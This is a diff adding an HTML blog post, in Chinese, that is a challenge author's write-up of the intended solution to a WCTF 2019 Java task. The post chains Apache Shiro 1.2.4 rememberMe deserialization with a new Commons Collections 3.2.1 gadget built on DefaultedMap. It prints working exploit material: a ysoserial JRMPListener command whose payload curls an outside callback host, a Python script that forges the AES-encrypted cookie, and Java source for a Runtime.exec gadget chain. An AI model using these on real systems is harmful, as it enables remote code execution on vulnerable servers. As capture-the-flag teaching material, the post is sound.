@@ -1,0 +1,63 @@
+<!DOCTYPE html><html><head><meta name="generator" content="Hexo 3.9.0"><meta charset="UTF-8"><title>Commons Collections3 新Map利用挖掘(WCTF出题笔记) [ 梅子酒の笔记本 ]</title><link rel="stylesheet" href="/css/meizj.css"><link rel="stylesheet" href="/css/prettify.css"><link rel="stylesheet" href="/css/tomorrow-night-blue.css"><link rel="stylesheet" href="/css/screen.css"><link rel="stylesheet" href="/css/tag.css"><script src="https://cdn.bootcss.com/jquery/3.4.0/jquery.min.js"></script><script src="https://cdn.bootcss.com/lazysizes/5.1.0/lazysizes.min.js"></script><script>$("img").attr({"class":"lazyload"});
+
+
+
+</script></head><body><div id="menu-outer"><nav id="menu-inner"><a id="menuLabel" href="/">Home</a><a id="menuLabel" href="/about">About</a><a id="menuLabel" href="/archives">Archives</a><a id="menuLabel" href="https://github.com/meizjm3i">Github</a></nav></div><div id="content-outer"><div id="content-inner"><div id="recent-posts"><a id="blogTitle">Meizj's Blog</a></div><article id="post"><h1 id="postTitle">Commons Collections3 新Map利用挖掘(WCTF出题笔记)</h1><p>在WCTF 2019中，每支队伍要求设计两道题目，我参与了其中一道题目的部分设计，该部分为Java安全。</p>
+<p>主要利用思路可总结为：</p>
+<ol>
+<li>shiro 1.2.4反序列化利用</li>
+<li>Commons Collections新利用链的挖掘</li>
+</ol>
+<p>赛后有两支队伍解出了该题目，分别是217和r3kapig，但是比较遗憾以及可惜的是，是通过利用CommonsBeanutils的非预期解出的，这篇文章就主要说说预期解法。</p>
+<p>第一部分的shiro 1.2.4的反序列化利用是一个老洞了，主要利用思路便是，在已知加密密钥的情况下，可以伪造RememberMe的Cookie，同时，该Cookie实质上是序列化过的数据，因此当我们已知密钥时，可以构造任意反序列化数据。</p>
+<p>题目提供了jar文件，在pom.xml文件中，很清晰地可以看到commons-collections-3.2.1以及shiro1.2.4，而业务功能则是标准的shiro认证流程，因此shiro利用阶段十分简单：</p>
+<blockquote>
+<p>利用jar文件中泄漏的硬编码密钥伪造反序列化数据</p>
+</blockquote>
+<p>直接通过构造反序列化RCE在本题中是行不通的，其中细节在Orange的博客中有详细的描述，由于不是本文的重点，因此这里直接给出链接，就不再细说。</p>
+<p>通过ysoserial的JRMPListener，我们可以利用CommonsCollections来完成对shiro的攻击。通过下面这条命令我们能新建一个JRMPListener:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial-0.0.6-SNAPSHOT-BETA-all.jar ysoserial.exploit.JRMPListener 9999 CommonsCollections7 <span class="string">"curl http://x2wugy.ceye.io/?aaaa"</span></span><br></pre></td></tr></table></figure>
+<p>生成序列化cookie的脚本为：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> Random</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode_rememberme</span><span class="params">(command)</span>:</span></span><br><span class="line">    popen = subprocess.Popen([<span class="string">'java'</span>, <span class="string">'-jar'</span>, <span class="string">'ysoserial-0.0.6-SNAPSHOT-BETA-all.jar'</span>, <span class="string">'JRMPClient'</span>, command], stdout=subprocess.PIPE)</span><br><span class="line">    BS   = AES.block_size</span><br><span class="line">    pad = <span class="keyword">lambda</span> s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()</span><br><span class="line">    key  =  <span class="string">"TWthODIwaVk4MmtpVTdkTg=="</span></span><br><span class="line">    mode =  AES.MODE_CBC</span><br><span class="line">    iv   =  uuid.uuid4().bytes</span><br><span class="line">    encryptor = AES.new(base64.b64decode(key), mode, iv)</span><br><span class="line">    file_body = pad(popen.stdout.read())</span><br><span class="line">    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))</span><br><span class="line">    <span class="keyword">return</span> base64_ciphertext</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    payload = encode_rememberme(sys.argv[<span class="number">1</span>])</span><br><span class="line">    print(payload)</span><br></pre></td></tr></table></figure>
+<p>将key替换为题目中硬编码的key，再运行上面的脚本，便可以得到JRMPClient的序列化数据，替换掉题目中的cookie，便能触发反序列化。</p>
+<p>当我们使用ysoserial构建payload会发现一个问题，那便是ysoserial中已有的CommonsCollections3.2.1相关payload都是不可用的，因此便需要我们重新挖掘一个不同于LazyMap和TransformedMap的CommonsCollections利用方式。</p>
+<p>接下来则是如何寻找一个有效的gadget完成反序列化的利用。<br>
+commons-collections3.2.1公开的几个利用链是：</p>
+<ol>
+<li>LazyMap</li>
+<li>TransformedMap</li>
+</ol>
+<p>而该题目的采取了一些非常暴力的方式将LazyMap和TransformedMap的链进行了摘除，此时就需要选手挖掘出一条新的commons-collections利用链。<br>
+如何挖掘新的链呢？我们可以参考LazyMap的exploit构造过程，结合网上已有的诸多资料，我们可以将LazyMap的调用流程归结为以下几步:</p>
+<blockquote>
+<ol>
+<li>BadAttributeValueExpException.readObject</li>
+<li>TiedMapEntry.toString</li>
+<li>TiedMapEntry.getValue</li>
+<li>LazyMap.get</li>
+<li>ChainedTransformer.transform</li>
+<li>InvokerTransformer.transform</li>
+</ol>
+</blockquote>
+<p>因此我们目标就可以缩小至寻找一个Map，在这个Map中，调用了transformer.transform，并且transformer的值可控，那么我们便有可能找到这么一个Map。</p>
+<p>实际情况是确实存在一个Map满足以上条件：DefaultedMap</p>
+<p>DefaultedMap与LazyMap类似，都是在get方法中调用transform，并且调用transform方法的对象都是可控的transformer，所以此时对我们而言，DefaultedMap的利用链和LazyMap的利用链几乎一致。其调用流程可归纳为：</p>
+<blockquote>
+<ol>
+<li>BadAttributeValueExpException.readObject</li>
+<li>TiedMapEntry.toString</li>
+<li>TiedMapEntry.getValue</li>
+<li>DefaultedMap.get</li>
+<li>ChainedTransformer.transform</li>
+<li>InvokerTransformer.transform</li>
+</ol>
+</blockquote>
+<p>由于其调用流程和LazyMap高度类似，因此我们可以直接在ysoserial中LazyMap相关payload的基础上进行小改。</p>
+<p>在ysoserial中，我们新增一个名为CommonsCollections7的payload作为DefaultedMap的payload，实现方式参照LazyMap进行编写:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> BadAttributeValueExpException <span class="title">getObject</span><span class="params">(<span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">final</span> String[] execArgs = <span class="keyword">new</span> String[] &#123; command &#125;;</span><br><span class="line">        <span class="comment">// inert chain for setup</span></span><br><span class="line">        <span class="keyword">final</span> Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(</span><br><span class="line">            <span class="keyword">new</span> Transformer[]&#123; <span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>) &#125;);</span><br><span class="line">        <span class="comment">// real chain for after setup</span></span><br><span class="line">        <span class="keyword">final</span> Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">            <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">"getMethod"</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">                String.class, Class[].class &#125;, <span class="keyword">new</span> Object[] &#123;</span><br><span class="line">                <span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">                Object.class, Object[].class &#125;, <span class="keyword">new</span> Object[] &#123;</span><br><span class="line">                <span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>,</span><br><span class="line">                <span class="keyword">new</span> Class[] &#123; String.class &#125;, execArgs),</span><br><span class="line">            <span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>) &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        <span class="keyword">final</span> Map defaultedmap = DefaultedMap.decorate(innerMap, transformerChain);</span><br><span class="line">        <span class="comment">//final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);</span></span><br><span class="line"></span><br><span class="line">        TiedMapEntry entry = <span class="keyword">new</span> TiedMapEntry(defaultedmap, <span class="string">"foo"</span>);</span><br><span class="line"></span><br><span class="line">        BadAttributeValueExpException val = <span class="keyword">new</span> BadAttributeValueExpException(<span class="keyword">null</span>);</span><br><span class="line">        Field valfield = val.getClass().getDeclaredField(<span class="string">"val"</span>);</span><br><span class="line">        valfield.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        valfield.set(val, entry);</span><br><span class="line"></span><br><span class="line">        Reflections.setFieldValue(transformerChain, <span class="string">"iTransformers"</span>, transformers); <span class="comment">// arm with actual transformer chain</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> val;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>随后重新编译一份jar，使用这个新的CommonsCollections的payload起一个JRMPListener便可以完成攻击了。</p>
+</article><div id="paginator"></div></div></div><div id="footer"><div id="bottom-inner"><span>Powerd By </span><span> Meizj </span><span>using    </span><a href="https://github.com/meizjm3i/Meizj"><span>Meizj</span></a><span>.</span><br></div></div><script src="/js/prettify.js"></script><script>//- $(window).on('load', function(){ 
+$('pre').addClass('prettyprint linenums');
+prettyPrint();
+//- });
+$(".gutter").remove();</script></body></html>
